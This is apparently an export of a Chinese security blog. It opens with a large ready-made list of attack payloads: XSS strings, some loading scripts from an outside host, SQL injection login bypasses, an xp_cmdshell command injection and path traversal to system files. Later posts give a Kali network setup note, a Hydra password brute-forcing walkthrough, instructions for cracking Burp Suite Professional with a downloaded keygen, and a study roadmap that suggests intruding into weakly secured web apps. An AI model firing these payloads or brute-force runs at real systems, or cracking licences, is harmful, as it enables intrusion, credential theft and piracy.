    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">=&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(vulnerable)&lt;/script&gt;</span><br><span class="line">%3Cscript%3Ealert(&apos;XSS&apos;)%3C/script%3E</span><br><span class="line">&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">%0a%0a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp</span><br><span class="line">%22%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini</span><br><span class="line">%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html</span><br><span class="line">%3f.jsp</span><br><span class="line">%3f.jsp</span><br><span class="line">&lt;script&gt;alert(&apos;Vulnerable&apos;);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line">?sql_debug=1</span><br><span class="line">a%5c.aspx</span><br><span class="line">a.jsp/&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line">a/</span><br><span class="line">a?&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line">&apos;;exec%20master..xp_cmdshell%20&apos;dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt&apos;--&amp;&amp;</span><br><span class="line">%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E</span><br><span class="line">%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;</span><br><span class="line">%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=</span><br><span class="line">1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=</span><br><span class="line">http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/etc/passwd</span><br><span class="line">..\..\..\..\..\..\..\..\windows\system.ini</span><br><span class="line">\..\..\..\..\..\..\..\..\windows\system.ini</span><br><span class="line">&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;</span><br><span class="line">&lt;IMG src=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG src=javascript:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG src=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG src=JaVaScRiPt:alert(&quot;XSS&quot;)&gt;</span><br><span class="line">&lt;IMG src=javascript:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG src=javascript:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line">&lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&quot;&lt;IMG src=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out</span><br><span class="line">&lt;IMG src=&quot; javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;</span><br><span class="line">&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;BGSOUND src=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;br size=&quot;&amp;&#123;alert(&apos;XSS&apos;)&#125;&quot;&gt;</span><br><span class="line">&lt;LAYER src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;</span><br><span class="line">&lt;LINK REL=&quot;stylesheet&quot; href=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG src=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;</span><br><span class="line">&lt;IMG src=&quot;mocha:[code]&quot;&gt;</span><br><span class="line">&lt;IMG src=&quot;livescript:[code]&quot;&gt;</span><br><span class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IFRAME src=javascript:alert(&apos;XSS&apos;)&gt;&lt;/IFRAME&gt;</span><br><span class="line">&lt;FRAMESET&gt;&lt;FRAME src=javascript:alert(&apos;XSS&apos;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;</span><br><span class="line">&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;behaviour: url(&apos;http://www.how-to-hack.org/exploit.html&apos;);&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;</span><br><span class="line">&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;</span><br><span class="line">&lt;IMG STYLE=&apos;xss:expre\ssion(alert(&quot;XSS&quot;))&apos;&gt;</span><br><span class="line">&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;</span><br><span class="line">&lt;STYLE TYPE=&quot;text/css&quot;&gt;.XSS&#123;background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;A class=&quot;XSS&quot;&gt;&lt;/A&gt;</span><br><span class="line">&lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="line">&lt;BASE href=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;</span><br><span class="line">getURL(&quot;javascript:alert(&apos;XSS&apos;)&quot;)</span><br><span class="line">a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript:&quot;;d=&quot;alert(&apos;XSS&apos;);&quot;;eval(a+b+c+d);</span><br><span class="line">&lt;XML src=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&quot;&gt; &lt;BODY ONLOAD=&quot;a();&quot;&gt;&lt;SCRIPT&gt;function a()&#123;alert(&apos;XSS&apos;);&#125;&lt;/SCRIPT&gt;&lt;&quot;</span><br><span class="line">&lt;SCRIPT src=&quot;http://xss.ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;IMG src=&quot;javascript:alert(&apos;XSS&apos;)&quot;</span><br><span class="line">&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;</span><br><span class="line">&lt;IMG src=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;</span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT =&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; &apos;&apos; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;A href=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;</span><br><span class="line">admin&apos;--</span><br><span class="line">&apos; or 0=0 --</span><br><span class="line">&quot; or 0=0 --</span><br><span class="line">or 0=0 --</span><br><span class="line">&apos; or 0=0 #</span><br><span class="line">&quot; or 0=0 #</span><br><span class="line">or 0=0 #</span><br><span class="line">&apos; or &apos;x&apos;=&apos;x</span><br><span class="line">&quot; or &quot;x&quot;=&quot;x</span><br><span class="line">&apos;) or (&apos;x&apos;=&apos;x</span><br><span class="line">&apos; or 1=1--</span><br><span class="line">&quot; or 1=1--</span><br><span class="line">or 1=1--</span><br><span class="line">&apos; or a=a--</span><br><span class="line">&quot; or &quot;a&quot;=&quot;a</span><br><span class="line">&apos;) or (&apos;a&apos;=&apos;a</span><br><span class="line">&quot;) or (&quot;a&quot;=&quot;a</span><br><span class="line">hi&quot; or &quot;a&quot;=&quot;a</span><br><span class="line">hi&quot; or 1=1 --</span><br><span class="line">hi&apos; or 1=1 --</span><br><span class="line">hi&apos; or &apos;a&apos;=&apos;a</span><br><span class="line">hi&apos;) or (&apos;a&apos;=&apos;a</span><br><span class="line">hi&quot;) or (&quot;a&quot;=&quot;a[/code]</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>security</category>
      </categories>
      <tags>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title>kail linux 网络配置</title>
    <url>/2019/07/14/security/kail%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>执行msfupdate更新metasploit时失败,<br><img src="/2019/07/14/security/kail网络配置/20190714_072132.png" alt><br>网络配置错误,下载失败.</p>
<a id="more"></a>
<p>按照如下配置网卡、DNS后，重启网络配置.</p>
<p><img src="/2019/07/14/security/kail网络配置/20190714_075249.png" alt></p>
<p>ping一下目标ip,发现网络已经ok。<br>继续执行操作即可.<br>另外: kail的默认密码为toor.</p>
]]></content>
      <categories>
        <category>security</category>
      </categories>
      <tags>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title>hydra试用</title>
    <url>/2019/06/14/security/hydra%E8%AF%95%E7%94%A8/</url>
    <content><![CDATA[<p>Hydra 对应的英文意思是九头蛇，它是一款爆破神器，可以对多种服务的账号和密码进行爆破，包括 Web 登录、数据库、SSH、FTP 等服务，支持 Linux、Windows、Mac 平台安装，其中 Kali Linux 中自带 Hydra。</p>
<a id="more"></a>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>kail linux 中已经集成了 hydra,这次在 windows 下安装.先到 github 下载<a href="https://github.com/maaaaz/thc-hydra-windows" target="_blank" rel="noopener">window 版本 hydra</a>.解压在命令行中输入 hydra,如果成功就会看到如下界面:</p>
<p><img src="/2019/06/14/security/hydra试用/20190614064616.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\tools\hacketools\thc-hydra-windows&gt;hydra</span><br><span class="line">Hydra v8.7-dev (c) 2018 by van Hauser/THC - Please do not use in military or sec</span><br><span class="line">ret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o</span><br><span class="line">FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN</span><br><span class="line">:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE</span><br><span class="line">  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE</span><br><span class="line">  -C FILE   colon separated &quot;login:pass&quot; format, instead of -L/-P options</span><br><span class="line">  -M FILE   list of servers to attack, one entry per line, &apos;:&apos; to specify port</span><br><span class="line">  -t TASKS  run TASKS number of connects in parallel per target (default: 16)</span><br><span class="line">  -U        service module usage details</span><br><span class="line">  -h        more command line options (COMPLETE HELP)</span><br><span class="line">  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)</span><br><span class="line">  service   the service to crack (see below for supported protocols)</span><br><span class="line">  OPT       some service modules support additional input (-U for module help)</span><br><span class="line"></span><br><span class="line">Supported services: adam6500 asterisk cisco cisco-enable cvs ftp ftps http[s]-&#123;h</span><br><span class="line">ead|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s]</span><br><span class="line">irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] mssql mysql nntp oracle-listener oracle</span><br><span class="line">-sid pcanywhere pcnfs pop3[s] postgres rdp redis rexec rlogin rpcap rsh rtsp s7-</span><br><span class="line">300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd</span><br><span class="line"> vnc xmpp</span><br><span class="line"></span><br><span class="line">Hydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL</span><br><span class="line">v3.0. The newest version is always available at http://www.thc.org/thc-hydra</span><br><span class="line">Don&apos;t use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Example:  hydra -l user -P passlist.txt ftp://192.168.0.1</span><br></pre></td></tr></table></figure>
<p>键入-h 查看更多命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\tools\hacketools\thc-hydra-windows&gt;hydra -h</span><br><span class="line">Hydra v8.7-dev (c) 2018 by van Hauser/THC - Please do not use in military or sec</span><br><span class="line">ret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o</span><br><span class="line">FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN</span><br><span class="line">:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -R        restore a previous aborted/crashed session</span><br><span class="line">  -I        ignore an existing restore file (don&apos;t wait 10 seconds)</span><br><span class="line">  -S        perform an SSL connect</span><br><span class="line">  -s PORT   if the service is on a different default port, define it here</span><br><span class="line">  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE</span><br><span class="line">  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE</span><br><span class="line">  -x MIN:MAX:CHARSET  password bruteforce generation, type &quot;-x -h&quot; to get help</span><br><span class="line">  -y        disable use of symbols in bruteforce, see above</span><br><span class="line">  -e nsr    try &quot;n&quot; null password, &quot;s&quot; login as pass and/or &quot;r&quot; reversed login</span><br><span class="line">  -u        loop around users, not passwords (effective! implied with -x)</span><br><span class="line">  -C FILE   colon separated &quot;login:pass&quot; format, instead of -L/-P options</span><br><span class="line">  -M FILE   list of servers to attack, one entry per line, &apos;:&apos; to specify port</span><br><span class="line">  -o FILE   write found login/password pairs to FILE instead of stdout</span><br><span class="line">  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1</span><br><span class="line">  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)</span><br><span class="line">  -t TASKS  run TASKS number of connects in parallel per target (default: 16)</span><br><span class="line">  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)</span><br><span class="line">  -w / -W TIME  wait time for a response (32) / between connects per thread (0)</span><br><span class="line">  -c TIME   wait time per login attempt over all threads (enforces -t 1)</span><br><span class="line">  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)</span><br><span class="line">  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode</span><br><span class="line">  -O        use old SSL v2 and v3</span><br><span class="line">  -q        do not print messages about connection errors</span><br><span class="line">  -U        service module usage details</span><br><span class="line">  -h        more command line options (COMPLETE HELP)</span><br><span class="line">  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)</span><br><span class="line">  service   the service to crack (see below for supported protocols)</span><br><span class="line">  OPT       some service modules support additional input (-U for module help)</span><br><span class="line"></span><br><span class="line">Supported services: adam6500 asterisk cisco cisco-enable cvs ftp ftps http[s]-&#123;h</span><br><span class="line">ead|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s]</span><br><span class="line">irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] mssql mysql nntp oracle-listener oracle</span><br><span class="line">-sid pcanywhere pcnfs pop3[s] postgres rdp redis rexec rlogin rpcap rsh rtsp s7-</span><br><span class="line">300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd</span><br><span class="line"> vnc xmpp</span><br><span class="line"></span><br><span class="line">Hydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL</span><br><span class="line">v3.0. The newest version is always available at http://www.thc.org/thc-hydra</span><br><span class="line">Don&apos;t use in military or secret service organizations, or for illegal purposes.</span><br><span class="line">These services were not compiled in: afp firebird ncp oracle radmin2 sapr3 svn.</span><br><span class="line"></span><br><span class="line">Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.</span><br><span class="line">E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)</span><br><span class="line"></span><br><span class="line">     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)</span><br><span class="line">     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080</span><br><span class="line">     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">  hydra -l user -P passlist.txt ftp://192.168.0.1</span><br><span class="line">  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN</span><br><span class="line">  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5</span><br><span class="line">  hydra -l admin -p password ftp://[192.168.0.0/24]/</span><br><span class="line">  hydra -L logins.txt -P pws.txt -M targets.txt ssh</span><br></pre></td></tr></table></figure>
<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]][-e nsr] [-o<br>FILE][-t tasks] [-M FILE [-T TASKS]][-w time] [-W TIME][-f] [-s PORT][-x min :max:charset] [-c TIME][-isouvvd46] [service://server[:PORT][/opt]]</p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><blockquote>
<ul>
<li>-R<br>从上一次的进度接着继续破解</li>
<li>-l</li>
</ul>
</blockquote>
<p>指定用户名登录</p>
<blockquote>
<ul>
<li>-L</li>
</ul>
</blockquote>
<p>指定用户名的文件(字典)</p>
<blockquote>
<ul>
<li>-p</li>
</ul>
</blockquote>
<p>指定密码登录</p>
<blockquote>
<ul>
<li>-P</li>
</ul>
</blockquote>
<p>指定密码文件(字典)</p>
<blockquote>
<ul>
<li>-C</li>
</ul>
</blockquote>
<p>指定用户名:密码的字典文件</p>
<blockquote>
<ul>
<li>-M</li>
</ul>
</blockquote>
<p>指定攻击的服务列表</p>
<blockquote>
<ul>
<li>-s</li>
</ul>
</blockquote>
<p>指定服务端口</p>
<blockquote>
<ul>
<li>-S</li>
</ul>
</blockquote>
<p>使用 SSL 连接</p>
<blockquote>
<ul>
<li>-o</li>
</ul>
</blockquote>
<p>保存攻击结果到文件</p>
<blockquote>
<ul>
<li>-t</li>
</ul>
</blockquote>
<p>设置攻击线程数</p>
<blockquote>
<ul>
<li>-w</li>
</ul>
</blockquote>
<p>设置连接超时时间</p>
<blockquote>
<ul>
<li>-e <nsr></nsr></li>
</ul>
</blockquote>
<p>可选选项，n：空密码试探, s：使用指定用户和密码试探, r: 反向登录</p>
<blockquote>
<ul>
<li>-v/-V/-d</li>
</ul>
</blockquote>
<p>显示破解用户名:密码对，-d debug 模式。</p>
<blockquote>
<ul>
<li>-q</li>
</ul>
</blockquote>
<p>不打印连接失败的信息</p>
<blockquote>
<ul>
<li>-4/-6</li>
</ul>
</blockquote>
<p>用 IP v4 或者 v6.</p>
<h1 id="试用"><a href="#试用" class="headerlink" title="试用"></a>试用</h1><h2 id="破解-mysql"><a href="#破解-mysql" class="headerlink" title="破解 mysql"></a>破解 mysql</h2><p><img src="/2019/06/14/security/hydra试用/20190614065915.png" alt></p>
<p>可以加上-o 保存结果到文件.</p>
<h2 id="破解-redis"><a href="#破解-redis" class="headerlink" title="破解 redis"></a>破解 redis</h2><p>没有用户名,直接使用密码字典即可.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -P ../password.txt -e nsr -V -o redis.txt  localhost redis</span><br></pre></td></tr></table></figure>
<p>基本模式就是这个样子,其他各种协议在具体场景中可以再具体使用.</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://www.cnblogs.com/shengulong/p/6337270.html" target="_blank" rel="noopener">常用密码词典</a></li>
<li><a href="https://wiki.skullsecurity.org/Passwords" target="_blank" rel="noopener">密码字典</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>security</category>
      </categories>
      <tags>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title>Burp Suite专业版安装</title>
    <url>/2019/06/03/security/burp%20suite%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p>准备工作</p>
<blockquote>
<p>JDK 1.8 安装</p>
<p>Burp Suite Professional 下载(1.7.37)</p>
</blockquote>
<a id="more"></a>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Burp Suite 是用于攻击 web 应用程序的集成平台，包含了许多工具。Burp Suite 为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的 HTTP 消息、持久性、认证、代理、日志、警报。</p>
<h2 id="工具箱"><a href="#工具箱" class="headerlink" title="工具箱"></a>工具箱</h2><p>Proxy——是一个拦截 HTTP/S 的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。<br>Spider——是一个应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。<br>Scanner[仅限专业版]——是一个高级的工具，执行后，它能自动地发现 web 应用程序的安全漏洞。<br>Intruder——是一个定制的高度可配置的工具，对 web 应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用 fuzzing 技术探测常规漏洞。<br>Repeater——是一个靠手动操作来补发单独的 HTTP 请求，并分析应用程序响应的工具。<br>Sequencer——是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。<br>Decoder——是一个进行手动执行或对应用程序数据者智能解码编码的工具。<br>Comparer——是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><p>到官网下载 burp suite 专业版,当前版本为 1.7.37.</p>
<h1 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h1><h2 id="下载-jar"><a href="#下载-jar" class="headerlink" title="下载 jar"></a>下载 jar</h2><p>百度网盘下载（H 大会一直更新）：<br>链接: <a href="https://pan.baidu.com/s/1brjPKM7" target="_blank" rel="noopener">https://pan.baidu.com/s/1brjPKM7</a> 密码: 9v4r</p>
<h2 id="破解-1"><a href="#破解-1" class="headerlink" title="破解"></a>破解</h2><p>点击 burp-loader-keygen.jar 启动激活程序,如果无法启动则可以在命令行执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -jar burp-loader-keygen.jar</span><br></pre></td></tr></table></figure>
<p>进入如下界面.<br><img src="/2019/06/03/security/burp suite安装/20190603104440.png" alt><br>修改 License Text,License 也随着改变.<br>复制 License，点击 Run 启动 Burp 主界面.</p>
<p><img src="/2019/06/03/security/burp suite安装/20190603105604.png" alt></p>
<p>然后点击 next 进入下一步,进入下面的界面<br><img src="/2019/06/03/security/burp suite安装/20190603105730.png" alt></p>
<p>点击 Manual activation 按钮进入下一步<br><img src="/2019/06/03/security/burp suite安装/20190603110348.png" alt><br>按照下图方式激活,先将图示 1 复制到 2 中,将生成的 activation response 复制到右图 4 位置，然后点击完成.<br><img src="/2019/06/03/security/burp suite安装/20190603110852.png" alt></p>
<p>可以看到激活成功,显示 2029 年过期.<br><img src="/2019/06/03/security/burp suite安装/20190603110951.png" alt></p>
<p>至此破解完成,可以探索安全的神秘世界了.</p>
]]></content>
      <categories>
        <category>security</category>
      </categories>
      <tags>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title>安全技术学习入门技能图</title>
    <url>/2019/05/16/security/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E6%8A%80%E8%83%BD%E5%9B%BE/</url>
    <content><![CDATA[<p>最近西电信安协会的技能轴更新了，这是老版的，我觉得更接地气.<br>注意，这十五个知识快可以组成几条不同的学习链路，然后基本上涵盖了信安主流的各个技术方向。当然知识体系不全，比如没提到 PHP和 MySQL。<br>但是注意学习周期，比如 1 的基本常识，上边有个日期“January 1, 2013 — January 15, 2013”，算下来就是 15 天的学习周期。这个周<br>期是西电的同学针对无基础，有大量课程的本科生指定的，咱们虽然也有实验室任务，但起码要折半吧。<br>在信息安全人才如此急缺的情况下，扎实的计算机、网络综合基础知识是前提，安全素质才是我们的核心竞争力。</p>
<a id="more"></a>
<h1 id="1、计算机基本常识"><a href="#1、计算机基本常识" class="headerlink" title="1、计算机基本常识"></a>1、计算机基本常识</h1><p>January 1, 2013 — January 15, 2013</p>
<h2 id="计算机基本常识"><a href="#计算机基本常识" class="headerlink" title="计算机基本常识"></a>计算机基本常识</h2><p>了解计算机基本常识，常用软件使用。<br>需要学会基本使用的软件或技术有：Word、VMware、VPN、Visual Studio、FireFox 及其插件、一款编辑器，学会如何截图、<br>编译运行程序、使用 Google 查询资料、邮件列表加入与收发。</p>
<h1 id="2、C-语言基础"><a href="#2、C-语言基础" class="headerlink" title="2、C 语言基础"></a>2、C 语言基础</h1><p>February 1, 2013 — June 1, 2013</p>
<h2 id="C-语言基础"><a href="#C-语言基础" class="headerlink" title="C 语言基础"></a>C 语言基础</h2><p>学习基础的 C 语言，不管是否是编程方向，我觉得都有必要了解一些 C 语言，会编写简单的 C 程序代码。<br>推荐的入门书籍有：谭浩强《C 程序设计》、《C 和指针》<br>C 语言对于初入门的同学来说是一座大山，但一旦翻过了这座大山，前面将会是一马平川。如果想深入研究 C 语言，《C 和指针》<br>这本书将是你最好的选择。</p>
<h1 id="3、数据结构"><a href="#3、数据结构" class="headerlink" title="3、数据结构"></a>3、数据结构</h1><p>April 1, 2013 — June 1, 2013</p>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>开发方向的同学必学，其他方向的同学也可以适当了解。<br>在 C 语言学习到一定阶段后，可以开始了解数据结构，它和 C 语言相辅相成，可以说在我们学习 C 语言的后期，很好的对我们 C 语<br>言知识进行了整理。当学习完成数据结构后就可以写一些 ACM 的竞赛题目了。<br>推荐郝斌老师的数据结构教学视频。</p>
<h1 id="4、Web-安全基础"><a href="#4、Web-安全基础" class="headerlink" title="4、Web 安全基础"></a>4、Web 安全基础</h1><p>March 1, 2013 — May 1, 2013</p>
<h2 id="web-安全基础"><a href="#web-安全基础" class="headerlink" title="web 安全基础"></a>web 安全基础</h2><p>了解 web 应用的各种常见漏洞（知道是什么，如何形成）：SQL 注入、XSS、CSRF、上传漏洞、解析漏洞、任意文件包含漏洞、<br>点击劫持、弱口令、cookie 欺骗等，<br>会使用一些常用入侵检测工具和辅助工具，并入侵一些安全系数较低的 web 应用。<br>了解关于 web 安全的周边知识，如：能判断某密码的 hash 类型、能识别一些常用的 web 指纹、能在互联网上搜索目标相关信息、<br>了解一句话木马并会利用等等。</p>
